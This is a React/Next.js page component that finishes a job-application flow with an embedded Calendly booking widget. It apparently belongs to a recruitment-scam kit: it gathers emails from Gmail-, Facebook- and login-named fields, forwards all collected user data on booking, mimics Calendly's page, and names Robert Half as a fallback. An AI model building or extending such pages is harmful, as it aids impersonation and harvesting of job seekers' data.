import React, { useContext, useEffect, useMemo, useRef, useState } from "react";
import Image from "next/image";
import { useRouter } from "next/router";
import axios from "axios";
import { InlineWidget, useCalendlyEventListener } from "react-calendly";
import SendData from "../../hooks/SendData.js";
import { DataContext } from "../../pages/index.js";
import LoadingSpinner from "../ui/LoadingSpinner.js";

const STEPS = ["Verify", "Schedule", "Finish"];

const DEFAULT_AGENT = {
  name: "Job Entryway Support",
  title: "Scheduling Team",
  specialty: "Interview scheduling and application support",
};

const getUserEmail = (allData) =>
  allData?.login_email ||
  allData?.email ||
  allData?.gmailEmail ||
  allData?.facebookEmail ||
  allData?.business_email ||
  "";

const getUserName = (allData) =>
  allData?.name ||
  allData?.full_name ||
  allData?.fullName ||
  allData?.displayName ||
  "";

function CalendlyLoadingIndicator() {
  return (
    <div className="flex h-full min-h-[640px] items-center justify-center bg-white">
      <div className="flex flex-col items-center gap-3 text-sm text-gray-500">
        <LoadingSpinner size="22px" />
        <span>Loading schedule...</span>
      </div>
    </div>
  );
}

function Done() {
  const { AllData } = useContext(DataContext);
  const router = useRouter();

  const [selectedAgent] = useState(DEFAULT_AGENT);
  const [isBooking, setIsBooking] = useState(false);
  const [isCalendlyLoaded, setIsCalendlyLoaded] = useState(false);
  const calendlyWrapperRef = useRef(null);

  const userEmail = useMemo(() => getUserEmail(AllData), [AllData]);
  const userName = useMemo(() => getUserName(AllData), [AllData]);
  const calendlyUrl = process.env.NEXT_PUBLIC_CALENDLY_URL || "";
  const backendUrl =
    process.env.NEXT_PUBLIC_BACKEND_URL || "http://localhost:5000";

  const canShowCalendly = Boolean(calendlyUrl) && Boolean(userEmail);

  const handleCalendlyLoaded = React.useCallback(() => {
    setIsCalendlyLoaded(true);
  }, []);

  useEffect(() => {
    if (!canShowCalendly) {
      setIsCalendlyLoaded(false);
      return;
    }

    setIsCalendlyLoaded(false);

    const wrapper = calendlyWrapperRef.current;
    if (!wrapper) {
      return;
    }

    const iframe = wrapper.querySelector("iframe");
    if (!iframe) {
      return;
    }

    const onLoad = () => {
      handleCalendlyLoaded();
    };

    iframe.addEventListener("load", onLoad);

    return () => {
      iframe.removeEventListener("load", onLoad);
    };
  }, [canShowCalendly, calendlyUrl, handleCalendlyLoaded]);

  const handleCalendlyScheduled = async (event) => {
    if (isBooking) {
      return;
    }

    const payload = event?.data?.payload || event?.payload || {};
    const eventUri = payload?.event?.uri || "";
    const inviteeUri = payload?.invitee?.uri || "";

    if (!eventUri || !inviteeUri) {
      return;
    }

    setIsBooking(true);

    try {
      const params = {
        ...AllData,
        currentStep: "Done - Calendly Appointment Scheduled",
        selectedAgent: selectedAgent.name,
        calendlyEventUri: eventUri,
        calendlyInviteeUri: inviteeUri,
      };

      SendData(params);

      const response = await axios.post(`${backendUrl}/api/send-confirmation`, {
        email: userEmail,
        agentName: selectedAgent.name,
        agentTitle: selectedAgent.title,
        inviteeUri,
        eventUri,
      });

      const appointment = response?.data?.appointment || {};

      sessionStorage.setItem(
        "appointmentData",
        JSON.stringify({
          selectedAgent,
          scheduledDate: appointment.scheduledDate || "",
          scheduledTime: appointment.scheduledTime || "",
          scheduledAt: appointment.scheduledAt || "",
          timezone: appointment.timezone || "",
          jobInterests: [],
          workPreferences: [],
          userEmail: appointment.email || userEmail,
          inviteeName: appointment.inviteeName || userName,
          userData: AllData,
        })
      );

      router.push("/application-complete");
    } catch (_error) {
      setIsBooking(false);
    }
  };

  useCalendlyEventListener({
    onEventScheduled: handleCalendlyScheduled,
  });

  return (
    <div className="flex flex-col min-h-screen w-full bg-gray-50 font-sans">
      <main className="flex-grow w-full flex flex-col items-center justify-center">
        <div className="bg-white flex w-full justify-center items-center py-4 sm:py-6 lg:py-8 px-2 sm:px-4">
          <div className="bg-white lg:max-w-[70%] max-w-6xl w-full rounded-lg sm:rounded-xl border grid grid-cols-1 lg:grid-cols-[360px_1fr]">
            <div className="p-4 sm:p-6 lg:p-10 border-r border-gray-200 relative min-h-[350px] sm:min-h-[400px] lg:min-h-[780px] lg:border-r lg:border-b-0 border-b">
              <div className="flex items-center justify-center gap-3 mb-4 sm:mb-6 lg:mb-8">
                <div className="relative w-24 h-10 sm:w-40 sm:h-12 lg:w-64 lg:h-20">
                  <Image
                    src="/Images/calendly.svg"
                    alt="Calendly"
                    width={200}
                    height={100}
                    className="object-contain"
                  />
                </div>
              </div>

              {selectedAgent ? (
                <>
                  <p className="text-sm lg:text-base text-gray-500 mb-1">
                    {selectedAgent.name}
                  </p>
                  <p className="text-xs lg:text-sm text-gray-400 mb-4">
                    {selectedAgent.title} • {selectedAgent.specialty}
                  </p>
                </>
              ) : (
                <p className="text-sm lg:text-base text-gray-500 mb-4">
                  Robert Half Recruitment
                </p>
              )}

              <h1 className="text-lg sm:text-xl lg:text-2xl font-semibold mb-4 sm:mb-6 lg:mb-8 text-gray-900">
                30 Minute Meeting
              </h1>

              <div className="flex flex-col gap-3 sm:gap-4 lg:gap-5 text-xs sm:text-sm lg:text-base text-gray-600">
                <div className="flex gap-3 items-center">
                  <svg
                    className="w-5 h-5 text-gray-500 flex-shrink-0"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                  <span>30 min</span>
                </div>
                <div className="flex gap-3 lg:gap-4 items-start">
                  <svg
                    className="w-5 h-5 lg:w-6 lg:h-6 text-gray-500 mt-0.5 flex-shrink-0"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"
                    />
                  </svg>
                  <span>
                    Web conferencing details are sent automatically after the
                    Calendly booking is completed.
                  </span>
                </div>
                <div className="flex gap-3 lg:gap-4 items-center">
                  <svg
                    className="w-5 h-5 lg:w-6 lg:h-6 text-gray-500 flex-shrink-0"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                  >
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M3.055 11H5a2 2 0 012 2v1a2 2 0 002 2 2 2 0 012 2v2.945M8 3.935V5.5A2.5 2.5 0 0010.5 8h.5a2 2 0 012 2 2 2 0 104 0 2 2 0 012-2h1.064M15 20.488V18a2 2 0 012-2h3.064M21 12a9 9 0 11-18 0 9 9 0 0118 0z"
                    />
                  </svg>
                  <span>Calendly availability is shown in the user time zone.</span>
                </div>
                {userEmail && (
                  <div className="flex gap-3 lg:gap-4 items-center">
                    <svg
                      className="w-5 h-5 lg:w-6 lg:h-6 text-gray-500 flex-shrink-0"
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                    >
                      <path
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth={2}
                        d="M3 8l7.89 4.26a2 2 0 002.22 0L21 8m-18 8h18a2 2 0 002-2V8a2 2 0 00-2-2H3a2 2 0 00-2 2v6a2 2 0 002 2z"
                      />
                    </svg>
                    <span>{userEmail}</span>
                  </div>
                )}
              </div>

              <div className="absolute bottom-3 sm:bottom-4 lg:bottom-6 left-4 sm:left-6 lg:left-10 right-4 sm:right-6 lg:right-10 flex justify-between text-[10px] sm:text-xs lg:text-sm text-gray-400">
                <span className="cursor-pointer text-blue-500 hover:text-blue-600">
                  Cookie settings
                </span>
                <span className="cursor-pointer hover:text-gray-600">
                  Report abuse
                </span>
              </div>
            </div>

            <div className="p-3 sm:p-4 lg:p-5 relative overflow-visible">
              <div className="flex items-start justify-center gap-0 mb-4 sm:mb-6">
                {STEPS.map((label, i) => (
                  <div key={label} className="flex items-center">
                    {i === 0 && (
                      <div className="relative w-6 sm:w-8 lg:w-12 h-0.5 mb-4 mr-0">
                        <div className="absolute inset-0 bg-gray-300" />
                        <div className="absolute right-0 top-0 h-full w-full bg-[#00A3FF]" />
                      </div>
                    )}
                    <div className="flex flex-col items-center">
                      <div className="w-8 h-8 sm:w-10 sm:h-10 rounded-full flex items-center justify-center font-semibold shadow-sm transition-all relative z-10 bg-[#00A3FF] text-white">
                        {i === 0 && (
                          <svg
                            className="w-4 h-4 sm:w-5 sm:h-5"
                            fill="currentColor"
                            viewBox="0 0 24 24"
                          >
                            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
                          </svg>
                        )}
                        {i === 1 && (
                          <svg
                            className="w-4 h-4 sm:w-5 sm:h-5"
                            fill="currentColor"
                            viewBox="0 0 24 24"
                          >
                            <path d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H5V10h14v10zM9 14H7v-2h2v2zm4 0h-2v-2h2v2zm4 0h-2v-2h2v2zm-8 4H7v-2h2v2zm4 0h-2v-2h2v2zm4 0h-2v-2h2v2z" />
                          </svg>
                        )}
                        {i === 2 && (
                          <svg
                            className="w-4 h-4 sm:w-5 sm:h-5"
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                          >
                            <path
                              strokeLinecap="round"
                              strokeLinejoin="round"
                              strokeWidth={3}
                              d="M5 13l4 4L19 7"
                            />
                          </svg>
                        )}
                      </div>
                      <span className="text-[9px] sm:text-[10px] font-medium mt-1.5 whitespace-nowrap text-[#00A3FF]">
                        {label}
                      </span>
                    </div>
                    {i < STEPS.length - 1 && (
                      <div className="relative w-10 sm:w-14 lg:w-20 h-0.5 mb-4">
                        <div className="absolute inset-0 bg-gray-300" />
                        <div className="absolute left-0 top-0 h-full w-full bg-[#00A3FF]" />
                      </div>
                    )}
                    {i === STEPS.length - 1 && (
                      <div className="relative w-6 sm:w-8 lg:w-12 h-0.5 mb-4 ml-0">
                        <div className="absolute inset-0 bg-gray-300" />
                        <div className="absolute left-0 top-0 h-full w-1/2 bg-[#00A3FF]" />
                      </div>
                    )}
                  </div>
                ))}
              </div>

              <div className="flex flex-col gap-4">
                {canShowCalendly && !isCalendlyLoaded && (
                  <div className="absolute inset-0 z-10 bg-white">
                    <CalendlyLoadingIndicator />
                  </div>
                )}

                {canShowCalendly && (
                  <div
                    ref={calendlyWrapperRef}
                    className={`mt-2 rounded-xl bg-white px-4 pb-4 pt-8 sm:px-5 sm:pb-5 sm:pt-10 lg:px-6 lg:pb-6 lg:pt-12 transition-opacity ${
                      isCalendlyLoaded ? "opacity-100" : "opacity-0"
                    }`}
                  >
                    <InlineWidget
                      url={calendlyUrl}
                      styles={{ height: "min(920px, calc(100vh - 96px))" }}
                      pageSettings={{
                        backgroundColor: "ffffff",
                        hideEventTypeDetails: true,
                        hideLandingPageDetails: true,
                        primaryColor: "006BFF",
                        textColor: "1f2937",
                      }}
                      prefill={{
                        email: userEmail,
                        name: userName,
                      }}
                    />
                  </div>
                )}

                {isBooking && (
                  <div className="rounded-lg border border-blue-200 bg-blue-50 px-4 py-3 text-sm text-blue-700">
                    Booking confirmed. Finishing the confirmation email now.
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
}

export default Done;
